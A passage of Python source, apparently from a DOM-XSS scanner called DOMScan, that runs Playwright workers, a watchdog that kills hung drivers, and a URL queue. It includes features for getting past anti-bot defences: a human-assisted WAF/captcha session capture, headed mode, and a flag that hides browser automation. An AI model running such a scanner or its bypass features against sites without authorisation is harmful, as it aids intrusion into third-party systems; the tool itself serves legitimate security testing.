                    context.add_init_script(script=preloadjs)
                    return browser, context

                browser, context = launch_browser()
                with worker_state_lock:
                    worker_state[wid] = {'last': time.time(), 'node_pid': node_pid}
                processed = 0    # per-browser URL count
                driver_urls = 0  # per-driver URL count
                while True:
                    try:
                        url = queue.get(timeout=1)
                    except Exception:
                        if done_event.is_set() and queue.empty():
                            break
                        continue
                    with worker_state_lock:
                        if wid in worker_state:
                            worker_state[wid]['last'] = time.time()
                            worker_state[wid]['url'] = url
                    try:
                        process_url(context, url, heartbeat=heartbeat)
                    except Exception as e:
                        if is_closed_error(e):
                            print(f"[worker {wid}] driver/browser closed on {url}, restarting driver", file=sys.stderr)
                            restart_driver = True
                            break
                        print(f"[worker {wid}] process_url: {e}", file=sys.stderr)
                    with worker_state_lock:
                        if wid in worker_state:
                            worker_state[wid]['url'] = None
                    processed += 1
                    driver_urls += 1
                    if driver_urls >= DRIVER_REFRESH_INTERVAL:
                        print(f"[worker {wid}] recycling playwright driver after {driver_urls} URLs", file=sys.stderr)
                        restart_driver = True
                        break
                    if processed >= BROWSER_REFRESH_INTERVAL:
                        # Recycle via a full driver restart (torn down by killing
                        # the node process below). browser.close() blocks forever
                        # on a wedged browser and never unwinds even when the
                        # driver is SIGKILLed — it leaked one worker thread per
                        # incident, which drove the slowdown-over-time spiral.
                        print(f"[worker {wid}] recycling browser after {processed} URLs", file=sys.stderr)
                        restart_driver = True
                        break
                    # No per-URL context.clear_cookies(): it has the same hang-and-
                    # leak behavior as close() on a wedged browser and was the
                    # second-biggest leak source. The recycle above resets all
                    # state every BROWSER_REFRESH_INTERVAL URLs; minor cookie bleed
                    # within that window is acceptable for a diverse-URL scanner.
                    # (With --session we intentionally keep cookies anyway.)
                if restart_driver:
                    # Between drivers: null the tracked pid so the watchdog's
                    # dead-driver check doesn't race the relaunch (the current
                    # driver is about to be torn down). The 60s hang timeout
                    # still guards this window.
                    with worker_state_lock:
                        if wid in worker_state:
                            worker_state[wid]['node_pid'] = None
                            worker_state[wid]['last'] = time.time()
                            worker_state[wid]['url'] = None
                # Tear down by killing the node process, NOT browser.close():
                # close() blocks forever on a wedged (especially headed) browser
                # and does not unwind even when the driver is later SIGKILLed,
                # leaking one worker thread per incident. Killing node is instant
                # and cascades to chromium via PR_SET_PDEATHSIG. No-op if node is
                # already dead (is_closed_error path).
                kill_node_driver(node_pid)
            # exiting 'with sync_playwright()' stops the (now dead) driver
            if not restart_driver:
                break  # queue drained or launch failure — worker exits
            # If the watchdog already evicted this wid, don't run as a ghost.
            with worker_state_lock:
                if wid not in worker_state:
                    break
            print(f"[worker {wid}] restarting playwright driver", file=sys.stderr)
    except Exception as e:
        print(f"[worker {wid}] died: {e}", file=sys.stderr)
    finally:
        with worker_state_lock:
            worker_state.pop(wid, None)


def watchdog(queue, next_wid_holder, target_workers, stop_event, done_event):
    """Kill hung workers, top up to target_workers when any worker died on its own."""
    def spawn_worker():
        new_wid = next_wid_holder[0]
        next_wid_holder[0] += 1
        with worker_state_lock:
            worker_state[new_wid] = {'last': time.time(), 'node_pid': None}
        t = threading.Thread(target=worker, args=(new_wid, queue, done_event), daemon=True)
        t.start()

    while not stop_event.is_set():
        time.sleep(5)
        now = time.time()
        stuck = []
        with worker_state_lock:
            for wid, st in list(worker_state.items()):
                node_pid = st.get('node_pid')
                # Dead driver: recover in ~5s instead of waiting the full 60s.
                # node_pid is nulled while a worker is legitimately between
                # drivers, so a None pid here is never treated as dead.
                dead_driver = node_pid is not None and not pid_alive(node_pid)
                if dead_driver or now - st['last'] > WORKER_TIMEOUT:
                    stuck.append((wid, node_pid, st.get('url'), dead_driver))
                    worker_state.pop(wid, None)
        for wid, node_pid, hung_url, dead_driver in stuck:
            reason = "driver died" if dead_driver else f"hung > {WORKER_TIMEOUT}s"
            if hung_url:
                d = urlparse(hung_url).netloc
                count = domain_record_error(d)
                print(f"[watchdog] worker {wid} {reason} on {hung_url} [{d} err {count}/{DOMAIN_MAX_ERRORS}], killing driver pid {node_pid}", file=sys.stderr)
            else:
                print(f"[watchdog] worker {wid} {reason} (idle), killing driver pid {node_pid}", file=sys.stderr)
            kill_node_driver(node_pid)
            spawn_worker()
        # Top up workers that died on their own (e.g. browser crash, OOM, exception).
        # Skip when work is drained — those workers exited normally.
        work_remaining = not (done_event.is_set() and queue.empty())
        if work_remaining:
            with worker_state_lock:
                deficit = target_workers - len(worker_state)
            for _ in range(max(0, deficit)):
                print(f"[watchdog] worker died unexpectedly, spawning replacement", file=sys.stderr)
                spawn_worker()
        # exit only after stdin/file is fully ingested AND queue drained AND no workers left
        if done_event.is_set() and queue.empty():
            with worker_state_lock:
                if not worker_state:
                    return


def capture_session(url, path, ua, viewport=None):
    """Open a visible browser at `url`, let the human pass any WAF/captcha, then
    save cookies + localStorage to `path` for reuse with --session. Needs a
    display (DISPLAY / WSLg). Use the SAME --ua and --viewport here and on the
    scan run — WAF anti-bot cookies are commonly bound to the User-Agent."""
    with sync_playwright() as p:
        browser = p.chromium.launch(
            headless=False,
            args=['--disable-blink-features=AutomationControlled'],
        )
        context = browser.new_context(
            user_agent=ua,
            ignore_https_errors=True,
            **({'viewport': viewport} if viewport else {}),
        )
        page = context.new_page()
        try:
            page.goto(url, timeout=30000, wait_until='commit')
        except Exception as e:
            print(f"[capture] goto: {e}", file=sys.stderr)
        print("\n[capture] A browser window is open. Solve any captcha / wait for the\n"
              "          real page to load, then press Enter here to save the session.",
              file=sys.stderr)
        try:
            input()
        except EOFError:
            # Non-interactive stdin (e.g. piped): give a fixed window instead.
            page.wait_for_timeout(15000)
        context.storage_state(path=path)
        print(f"[capture] saved session ({len(context.cookies())} cookies) to {path}", file=sys.stderr)
        try:
            browser.close()
        except Exception:
            pass


def main():
    global preloadjs, injectjs, stage1_wait, output_file, debug_mode, dedup, extra_headers, storage_state_path, headed, viewport
    preloadjs = getPreloadJS()
    injectjs = getInjectJS()
    with open("js/preload_debug.js", "w") as f:
        f.write(preloadjs)

    parser = argparse.ArgumentParser(description="Process URLs with DOMScan.")
    parser.add_argument('-u','--urls', help="File containing URLs to process")
    parser.add_argument('-t','--threads', type=int, default=10, help="Maximum number of threads to use")
    parser.add_argument('-w','--wait', type=float, default=0, help="Seconds to wait after page load on stage 1")
    parser.add_argument('-o','--output', help="File to write confirmed findings to (truncated on open)")
    parser.add_argument('-d','--debug', action='store_true', help="Print unconfirmed sinks and reflected hits to stdout")
    parser.add_argument('-D','--dedup', action='store_true', help="Enable per-domain sink/reflected deduplication")
    parser.add_argument('-H','--header', action='append', default=[],
                        help='Extra HTTP header "Name: Value" sent on every request (repeatable)')
    parser.add_argument('--ua', help="Override the User-Agent from config.yaml (use the same value for capture and scan)")
    parser.add_argument('--session', metavar='PATH',
                        help="Load this storage_state JSON (cookies + localStorage) into every context and keep cookies across URLs — reuse a real, WAF-passed session")
    parser.add_argument('--capture-session', metavar='URL',
                        help="Headed capture: open URL, let you solve any WAF/captcha, then save the session to --session PATH and exit")
    parser.add_argument('--headed', action='store_true',
                        help="Run browsers visibly (needs a display) — drops the HeadlessChrome fingerprint; use with --session to match a captured session")
    parser.add_argument('--viewport', metavar='WxH',
                        help="Fixed viewport size, e.g. 430x932 for mobile (default 1280x720). Use the same value for capture and scan")
    args = parser.parse_args()
    headed = args.headed
    if args.viewport:
        try:
            w, h = (int(x) for x in args.viewport.lower().split('x', 1))
            viewport = {'width': w, 'height': h}
        except ValueError:
            parser.error(f"--viewport expects WxH (e.g. 430x932), got: {args.viewport}")
    stage1_wait = args.wait
    debug_mode = args.debug
    dedup = args.dedup
    if args.ua:
        config['ua'] = args.ua
    if args.capture_session:
        if not args.session:
            parser.error("--capture-session requires --session PATH to save the session to")
        capture_session(args.capture_session, args.session, config['ua'], viewport)
        return
    if args.session:
        storage_state_path = args.session
        print(f"[session] reusing {storage_state_path} (cookies kept across URLs)", file=sys.stderr)
    for h in args.header:
        if ':' not in h:
            print(f"[header] ignoring malformed (expected 'Name: Value'): {h}", file=sys.stderr)
            continue
        name, _, value = h.partition(':')
        extra_headers[name.strip()] = value.strip()
    if args.output:
        output_file = open(args.output, 'w', buffering=1)

    queue = Queue()
    done_event = threading.Event()

    if args.urls:
        with open(args.urls, 'r') as file:
            for url in file:
                queue.put(url.strip())
        done_event.set()

    next_wid_holder = [args.threads]
    for i in range(args.threads):
        t = threading.Thread(target=worker, args=(i, queue, done_event), daemon=True)
        t.start()

    stop_event = threading.Event()
    wd = threading.Thread(target=watchdog, args=(queue, next_wid_holder, args.threads, stop_event, done_event), daemon=True)
    wd.start()

    if not args.urls:
        for url in sys.stdin:
            url = url.strip()
            if url:
                queue.put(url)
        done_event.set()

    wd.join()
    stop_event.set()

def getInjectJS():
    with open('js/preload_inject.js', 'r') as f:
        return f.read()


def getPreloadJS():
    preload_script = config.get('preload_script', None)
    with open(preload_script, 'r') as f:
        preload_jscontent = f.read()

    preload_jscontent = preload_jscontent.replace("{{canary}}", config['canary'])
    preload_jscontent = preload_jscontent.replace('"{{topparams}}"', str(config['topparams']))

    return preload_jscontent

if __name__ == "__main__":
    main()
